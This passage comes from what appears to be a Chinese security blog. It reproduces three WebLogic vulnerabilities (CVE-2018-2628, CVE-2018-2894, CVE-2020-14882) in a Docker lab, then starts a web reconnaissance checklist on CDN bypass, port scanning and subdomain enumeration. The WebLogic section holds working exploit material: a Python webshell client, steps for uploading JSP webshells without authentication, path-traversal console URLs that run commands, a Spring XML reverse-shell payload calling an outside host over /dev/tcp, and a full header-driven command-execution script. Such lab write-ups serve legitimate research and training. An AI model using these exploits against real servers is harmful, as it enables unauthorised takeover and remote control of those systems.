<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">print r&#x27;&#x27;&#x27;</span><br><span class="line">https://github.com/jas502n/CVE-2018-2628</span><br><span class="line">@author Jas502n</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">from urllib import *</span><br><span class="line">def shell(url,cmd):</span><br><span class="line">    all_url = url + &quot;?tom=&quot; + base64.b64encode(cmd)</span><br><span class="line">    try:</span><br><span class="line">        result = requests.get(all_url)</span><br><span class="line">        if result.status_code == 200:</span><br><span class="line">            print result.content</span><br><span class="line">    except requests.ConnectionError,e:</span><br><span class="line">        print e</span><br><span class="line">th = &#123;&quot;url&quot;:&quot;&quot;&#125;</span><br><span class="line">while True:</span><br><span class="line">    if th.get(&quot;url&quot;) != &quot;&quot;:</span><br><span class="line">        input_cmd = raw_input(&quot;cmd &gt;&gt;: &quot;)</span><br><span class="line">        if input_cmd == &quot;exit&quot;:</span><br><span class="line">            exit()</span><br><span class="line">        elif input_cmd == &#x27;set&#x27;:</span><br><span class="line">            url = raw_input(&quot;set shell :&quot;)</span><br><span class="line">            th[&#x27;url&#x27;] = url</span><br><span class="line">        elif input_cmd == &#x27;show url&#x27;:</span><br><span class="line">            print th.get(&quot;url&quot;)</span><br><span class="line">        else:</span><br><span class="line">            shell(th.get(&quot;url&quot;),input_cmd)</span><br><span class="line">    else:</span><br><span class="line">        url = raw_input(&quot;set shell :&quot;)</span><br><span class="line">        th[&quot;url&quot;] = url</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>项目地址：</p>
<p><a href="https://github.com/0xMJ/CVE-2018-2628/">https://github.com/0xMJ/CVE-2018-2628/</a></p>
<p>可能是在 Linux 的关系，没有成功。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019094544453.png" alt="image-20211019094544453" style="zoom:50%;" />



<h2 id="0x07-CVE-2018-2894"><a href="#0x07-CVE-2018-2894" class="headerlink" title="0x07 CVE-2018-2894"></a>0x07 CVE-2018-2894</h2><p>WebLogic 未授权访问漏洞(CVE-2018-2894)，存在两个未授权的页面，可以上传任意文件，但是这两个页面只在开发环境下存在</p>
<blockquote>
<p>漏洞复现</p>
</blockquote>
<p>这里我们首先打开docker的开发环境。这里因为不是弱口令的docker，所以这里我们执行命令看一下进入后台的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs | grep password</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019102139150.png" alt="image-20211019102139150"></p>
<p>使用账号密码登录后台</p>
<p>点击 <code>base_domain</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019102330156.png" alt="image-20211019102330156" style="zoom:50%;" />

<p>点击 <code>高级</code> 选项</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019102418080.png" alt="image-20211019102418080" style="zoom:50%;" />

<p>勾选 <code>启动 web 服务测试页</code>，保存即可进入开发环境</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019102524677.png" alt="image-20211019102524677" style="zoom:50%;" />

<p>开发环境下的测试页有两个，分别为<code>config.do</code>和<code>begin.do</code></p>
<ol>
<li>config.do</li>
</ol>
<p>首先进入<code>config.do</code>文件进行设置，将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
<p><a href="http://127.0.0.1:7001/ws_utc/config.do">http://127.0.0.1:7001/ws_utc/config.do</a></p>
<p>将下面的内容替换掉下图的 <code>当前的工作目录</code> 的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019102909536.png" alt="image-20211019102909536" style="zoom:50%;" />

<p>点击 <code>安全</code> ，点击 <code>Add</code> ，上传一个 jsp 马，提交。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019103105271.png" alt="image-20211019103105271" style="zoom:50%;" />

<p>提交后，点击 <code>F12</code> ，审查元素，查看上传后的时间戳</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019103323608.png" alt="image-20211019103323608" style="zoom:50%;" />

<p>构造得到<a href="http://127.0.0.1:7001/ws_utc/css/config/keystore/1634611019115_shell.jsp%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://127.0.0.1:7001/ws_utc/css/config/keystore/1634611019115_shell.jsp，连接即可</a></p>
<ol start="2">
<li>begin.do</li>
</ol>
<p>打开 <code>F12</code> ，点击 <code>网络</code>，上传一个 jsp 马</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019115938943.png" alt="image-20211019115938943"></p>
<p>会提示出错，但不需要理会，在<code>网络</code> 中找到一个 POST 包，里面有上传的 shell 地址</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019120324333.png" alt="image-20211019120324333" style="zoom:50%;" />

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019120449443.png" alt="image-20211019120449443"></p>
<p>构造得到</p>
<p><a href="http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2021-10-19_04-01-03_731/import_file_name_shell.jsp">http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2021-10-19_04-01-03_731/import_file_name_shell.jsp</a></p>
<p>蚁剑连接成功</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019120636134.png" alt="image-20211019120636134" style="zoom:50%;" />

<h2 id="0x08-CVE-2020-14882"><a href="#0x08-CVE-2020-14882" class="headerlink" title="0x08 CVE-2020-14882"></a>0x08 CVE-2020-14882</h2><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并执行任意代码。</p>
<blockquote>
<p>影响版本</p>
</blockquote>
<ul>
<li>10.3.6.0.0</li>
<li>12.1.3.0.0</li>
<li>12.2.1.3.0</li>
<li>12.2.1.4.0</li>
<li>14.1.1.0.0</li>
</ul>
<blockquote>
<p>漏洞详情</p>
</blockquote>
<p><a href="https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4">https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4</a></p>
<blockquote>
<p>漏洞复现</p>
</blockquote>
<p>进入后台登录界面，直接构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure>

<p>即可访问后台，达到未授权的效果。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019121227873.png" alt="image-20211019121227873" style="zoom: 33%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019121245201.png" alt="image-20211019121245201" style="zoom: 33%;" />

<p>但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写shell进去，这里就需要用到远程加载XML文件拿shell</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019121336704.png" alt="image-20211019121336704" style="zoom:50%;" />

<p>首先测试以下漏洞代码执行是否成功，在&#x2F;tmp&#x2F;下创建一个test文件夹</p>
<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/test%27);%22);</span><br></pre></td></tr></table></figure>

<p>得到如下界面，这里看起来没有利用成功</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019121500463.png" alt="image-20211019121500463" style="zoom:50%;" />

<p>我们进入docker查看发现文件夹已经创建成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker exec -it b6a1b6c3e4d1 /bin/bash</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211019121654027.png" alt="image-20211019121654027" style="zoom:50%;" />

<p>kali 创建一个xml文件，还是使用bash命令得到反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">&lt;constructor-arg&gt;</span><br><span class="line">&lt;list&gt;</span><br><span class="line">&lt;value&gt;/bin/bash&lt;/value&gt;</span><br><span class="line">&lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.10.1/5555 0&gt;&amp;1]]&gt;&lt;/value&gt;</span><br><span class="line">&lt;/list&gt;</span><br><span class="line">&lt;/constructor-arg&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>python 起一个 http 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>

<p>nc开启监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http://192.168.10.1:8000/test.xml&quot;)</span><br></pre></td></tr></table></figure>

<p>让它下载 vps 上的反弹shell，即可得到反弹shell。</p>
<p>但是没有成功，原因未知。。。</p>
<p>尝试利用 exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">#下面这三行代码是为了解决requests的一个bug，就是Connection broken: IncompleteRead</span><br><span class="line">#其实真正的原因我到现在也不清楚，但是下面这三行代码确实可以解决问题</span><br><span class="line">#参考https://my.oschina.net/u/1538135/blog/858467</span><br><span class="line">#python3.x中的httplib变成了http.client需要修改一下</span><br><span class="line">import http.client</span><br><span class="line">http.client.HTTPConnection._http_vsn = 10</span><br><span class="line">http.client.HTTPConnection._http_vsn_str = &#x27;HTTP/1.0&#x27;</span><br><span class="line">if len(sys.argv) &lt;3:</span><br><span class="line">    print(&#x27;用法：python exp.py http(s):target-ip:target-port command&#x27;)</span><br><span class="line">    sys.exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">#去掉url最后面的/</span><br><span class="line">if baseurl[-1]==&#x27;/&#x27;:</span><br><span class="line">    baseurl = baseurl[0:-1]</span><br><span class="line">#命令中包含空格的情况</span><br><span class="line">cmd = sys.argv[2]</span><br><span class="line">if len(sys.argv) &gt; 3:</span><br><span class="line">    i = 3</span><br><span class="line">    while i &lt; len(sys.argv):</span><br><span class="line">        #在linux中可以使用$&#123;IFS&#125;代替空格</span><br><span class="line">        #windows的话部分命令可以使用=替代空格，大家可以自行修改脚本</span><br><span class="line">        cmd += &#x27; &#x27;</span><br><span class="line">        cmd += sys.argv[i]</span><br><span class="line">        i += 1</span><br><span class="line">#调试的时候使用burp代理抓包，便于发现脚本的问题</span><br><span class="line">proxy = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line">res = baseurl + &quot;/console/css/%252e%252e%252fconsole.portal&quot;</span><br><span class="line">#设置不跟随302重定向，不然会获取不到cookie</span><br><span class="line">#response = requests.get(res, proxies=proxy,allow_redirects=False)</span><br><span class="line">response = requests.get(res, allow_redirects=False)</span><br><span class="line">cookie_raw = response.headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line">matchObj = re.match( r&#x27;(.*); path=/.*?&#x27;, cookie_raw, re.M|re.I)</span><br><span class="line">if matchObj:</span><br><span class="line">    cookie = matchObj.group(1)</span><br><span class="line">    #print(cookie)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;未获取到cookie！&#x27;)</span><br><span class="line">    sys.exit();</span><br><span class="line"></span><br><span class="line">#获取到cookie之后，发送第二个请求，用于执行命令</span><br><span class="line">#注意 useDelimiter(&quot;\\A&quot;) 这个地方的两个\，需要再次转义，不然python会把其中一个作为</span><br><span class="line">#转义符处理，导致真正发送的请求中只包含一个\</span><br><span class="line">res = baseurl + &quot;&quot;&quot;/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&quot;&quot;&quot;</span><br><span class="line">headers = &#123;&quot;cookie&quot;:cookie, &quot;cmd&quot;:cmd&#125;</span><br><span class="line">#response = requests.get(res, headers=headers, proxies=proxy, allow_redirects=False)</span><br><span class="line">response = requests.get(res, headers=headers, allow_redirects=False)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019132655146.png" alt="image-20211019132655146"></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Web信息收集CheckList</title>
    <url>/posts/c81b611f.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h2><blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/EojC9fYiBlKGG_Cv5f3xzw">https://mp.weixin.qq.com/s/EojC9fYiBlKGG_Cv5f3xzw</a></p>
</blockquote>
<h2 id="1-获取真实IP"><a href="#1-获取真实IP" class="headerlink" title="1.获取真实IP"></a><strong>1.获取真实IP</strong></h2><p>😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅</p>
<h3 id="2-判断是否是CDN"><a href="#2-判断是否是CDN" class="headerlink" title="2.判断是否是CDN"></a><strong>2.判断是否是CDN</strong></h3><h4 id="使用ping域名判断是否有CDN"><a href="#使用ping域名判断是否有CDN" class="headerlink" title="使用ping域名判断是否有CDN"></a><strong>使用ping域名判断是否有CDN</strong></h4><p>直接使用ping域名查看回显地址来进行判断，如下回显<code>cname.vercel-dns.com</code>，很明显使用了cdn技术。</p>
<h4 id="使用不同主机ping域名判断是否有CDN"><a href="#使用不同主机ping域名判断是否有CDN" class="headerlink" title="使用不同主机ping域名判断是否有CDN"></a><strong>使用不同主机ping域名判断是否有CDN</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全球Ping测试：https://www.wepcc.com/</span><br><span class="line">站长工具Ping检测：http://ping.chinaz.com/</span><br><span class="line">爱站网Ping检测：https://ping.aizhan.com/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442141.png" alt="图片"></p>
<p>可以发现对<code>www.zjun.info</code>的全球ping测试，有<code>76.223.126</code>、<code>76.76.21.21</code>这两个不同的解析IP，说明<code>www.zjun.info</code>可能使用了CDN。</p>
<h4 id="使用nslookup域名解析判断是否有CDN"><a href="#使用nslookup域名解析判断是否有CDN" class="headerlink" title="使用nslookup域名解析判断是否有CDN"></a><strong>使用nslookup域名解析判断是否有CDN</strong></h4><p>通过系统自带的<code>nslookup</code>命令对域名解析，发现其中的<code>Name</code>字段直接指向<code>cname.vercel-dns.com</code>，毫无疑问使用了CDN技术。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442142.png" alt="图片"></p>
<p>又比如<code>www.baidu.com</code>，其中<code>Address</code>字段也是指向两个不同IP，即<code>www.baidu.com</code>可能使用了CDN。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442153.png" alt="图片"></p>
<h3 id="3-绕过CDN获取真实IP"><a href="#3-绕过CDN获取真实IP" class="headerlink" title="3.绕过CDN获取真实IP"></a><strong>3.绕过CDN获取真实IP</strong></h3><h4 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a><strong>查询子域名</strong></h4><p>由于CDN加速需要支付一定的费用，很多网站只对主站做了CDN加速，子域名没有做CDN加速，子域名可能跟主站在同一个服务器或者同一个C段网络中，可以通过子域名探测的方式，收集目标的子域名信息，通过查询子域名的IP信息来辅助判断主站的真实IP信息。</p>
<h4 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a><strong>查询历史DNS记录</strong></h4><p>通过查询DNS与IP绑定的历史记录就有可能发现之前的真实IP信息，常用的第三方服务网站有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsdb：https://dnsdb.io/zh-cn/view</span><br><span class="line">dns：https://viewdns.info/iphistory/</span><br><span class="line">微步在线：https://x.threatbook.cn/</span><br></pre></td></tr></table></figure>

<h4 id="使用国外主机请求域名"><a href="#使用国外主机请求域名" class="headerlink" title="使用国外主机请求域名"></a><strong>使用国外主机请求域名</strong></h4><p>部分国内的CDN加速服务商只对国内的线路做了CDN加速，但是国外的线路没有做加速，这样就可以通过国外的主机来探测真实的IP信息。</p>
<h4 id="网站信息泄露漏洞"><a href="#网站信息泄露漏洞" class="headerlink" title="网站信息泄露漏洞"></a><strong>网站信息泄露漏洞</strong></h4><p>利用网站存在的漏洞和信息泄露的敏感信息、文件（如：phpinfo文件、网站源码文件、Github泄露的信息等）获取真实的IP信息。</p>
<p>phpinfo页面中有一个<code>SERVER_ADDR</code>字段会显示该主机真实IP。</p>
<h4 id="邮件信息"><a href="#邮件信息" class="headerlink" title="邮件信息"></a><strong>邮件信息</strong></h4><p>一般的邮件系统都在内部，没有经过CDN的解析，通过利用目标网站的邮箱注册、找回密码或者RSS订阅等功能，接收到发来的邮件后，查看邮件源码就可以获得目标的真实IP。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442154.png" alt="图片"></p>
<h4 id="目标网站APP应用"><a href="#目标网站APP应用" class="headerlink" title="目标网站APP应用"></a><strong>目标网站APP应用</strong></h4><p>如果目标网站有自己的App，可以尝试利用Burp Suite等流量抓包工具抓取App的请求，从里面可能会找到目标的真实IP。</p>
<h2 id="4-旁站查询（IP反查）"><a href="#4-旁站查询（IP反查）" class="headerlink" title="4.旁站查询（IP反查）"></a><strong>4.旁站查询（IP反查）</strong></h2><p>旁站信息收集也称为IP反查，主要有以下方式：</p>
<h3 id="Nmap扫描获取旁站信息"><a href="#Nmap扫描获取旁站信息" class="headerlink" title="Nmap扫描获取旁站信息"></a><strong>Nmap扫描获取旁站信息</strong></h3><p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 1-65535 x.x.x.x </span><br></pre></td></tr></table></figure>

<p>对目标IP进行全端口扫描，确保每个可能开放的端口服务都能识别到。</p>
<h3 id="第三方服务获取旁站信息"><a href="#第三方服务获取旁站信息" class="headerlink" title="第三方服务获取旁站信息"></a>第三方服务获取旁站信息</h3><p>旁站信息可以通过第三方服务进行收集，比如在线网站与搜索引擎等。以下是几个在线搜集网站：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">站长工具同IP网站查询：http://s.tool.chinaz.com/same</span><br><span class="line">webscan：https://www.webscan.cc/</span><br><span class="line">云悉：https://www.yunsee.cn/</span><br><span class="line">微步在线：https://x.threatbook.cn/</span><br><span class="line">在线旁站查询|C段查询|必应接口C段查询：http://www.bug8.me/bing/bing.php</span><br></pre></td></tr></table></figure>

<p>也可以利用搜索引擎语法来实现查询：</p>
<p>bing</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cn.bing.com/search?q=ip:x.x.x.x</span><br></pre></td></tr></table></figure>

<p>fofa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=&quot;x.x.x.x&quot;</span><br></pre></td></tr></table></figure>

<h2 id="5-C段主机查询"><a href="#5-C段主机查询" class="headerlink" title="5.C段主机查询"></a><strong>5.C段主机查询</strong></h2><h3 id="Nmap扫描C段"><a href="#Nmap扫描C段" class="headerlink" title="Nmap扫描C段"></a><strong>Nmap扫描C段</strong></h3><p>使用命令<code>nmap -sn x.x.x.x/24</code>，对目标IP的C段主机进行存活扫描，根据扫描的结果可以判断目标IP的C段还有哪些主机存活。</p>
<p><code>nmap -Pn</code>这个命令在实际工作中的使用很多，该命令不通过ICMP协议进行主机存活判断，会直接对端口进行扫描。这样在开启了防火墙禁Ping的情况下，也可以利用这个命令正常扫描目标是否存活及对外开启的相关服务。</p>
<h3 id="搜索引擎语法收集C段信息"><a href="#搜索引擎语法收集C段信息" class="headerlink" title="搜索引擎语法收集C段信息"></a><strong>搜索引擎语法收集C段信息</strong></h3><p>Google</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:x.x.x.*</span><br></pre></td></tr></table></figure>

<p>Fofa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=&quot;x.x.x.x/24&quot;</span><br></pre></td></tr></table></figure>

<p>在线C段扫描工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在线旁站查询|C段查询|必应接口C段查询：http://www.bug8.me/bing/bing.php</span><br><span class="line">查旁站：https://chapangzhan.com/</span><br><span class="line">云悉：https://www.yunsee.cn/</span><br></pre></td></tr></table></figure>

<h3 id="本地C段扫描工具（其中某些工具不只是C段扫描）"><a href="#本地C段扫描工具（其中某些工具不只是C段扫描）" class="headerlink" title="本地C段扫描工具（其中某些工具不只是C段扫描）"></a><strong>本地C段扫描工具（其中某些工具不只是C段扫描）</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpscan：https://github.com/zer0h/httpscan</span><br><span class="line">小米范web查找器</span><br><span class="line">Goby：https://gobies.org/</span><br><span class="line">bufferfly：https://github.com/dr0op/bufferfly</span><br><span class="line">cscan：https://github.com/z1un/cscan</span><br></pre></td></tr></table></figure>

<h2 id="6-子域名查询"><a href="#6-子域名查询" class="headerlink" title="6.子域名查询"></a><strong>6.子域名查询</strong></h2><h3 id="枚举发现子域名"><a href="#枚举发现子域名" class="headerlink" title="枚举发现子域名"></a><strong>枚举发现子域名</strong></h3><p>子域名收集可以通过枚举的方式对子域名进行收集，枚举需要一个好的字典，制作字典时会将常见子域名的名字放到字段里面，增加枚举的成功率。子域名暴力破解常用的工具以下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在线子域名查询：https://phpinfo.me/domain/</span><br><span class="line">OneForAll：https://github.com/shmilylty/OneForAll</span><br><span class="line">knock：https://github.com/guelfoweb/knock</span><br><span class="line">subDomainsBrute：https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">Layer子域名挖掘机：https://github.com/euphrat1ca/LayerDomainFinder</span><br></pre></td></tr></table></figure>

<h3 id="搜索引擎发现子域名"><a href="#搜索引擎发现子域名" class="headerlink" title="搜索引擎发现子域名"></a><strong>搜索引擎发现子域名</strong></h3><p>使用搜索引擎语法，如</p>
<p>Google或者百度等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xxx.com</span><br></pre></td></tr></table></figure>

<p>Fofa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">domain=&quot;xxx.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="第三方聚合服务发现子域名"><a href="#第三方聚合服务发现子域名" class="headerlink" title="第三方聚合服务发现子域名"></a><strong>第三方聚合服务发现子域名</strong></h3><p>第三方聚合平台 Netcraft、Virustotal、ThreatCrowd、DNSdumpster 和 ReverseDNS 等获取子域信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sublist3r：https://github.com/aboul3la/Sublist3r</span><br><span class="line">OneForAll：https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></figure>

<h3 id="证书透明性信息发现子域名"><a href="#证书透明性信息发现子域名" class="headerlink" title="证书透明性信息发现子域名"></a><strong>证书透明性信息发现子域名</strong></h3><p>证书透明性（Certificate Transparency，CT）是Google的公开项目，通过让域所有者、CA和域用户对SSL证书的发行和存在进行审查，来纠正这些基于证书的威胁。具体而言，证书透明性具有三个主要目标：</p>
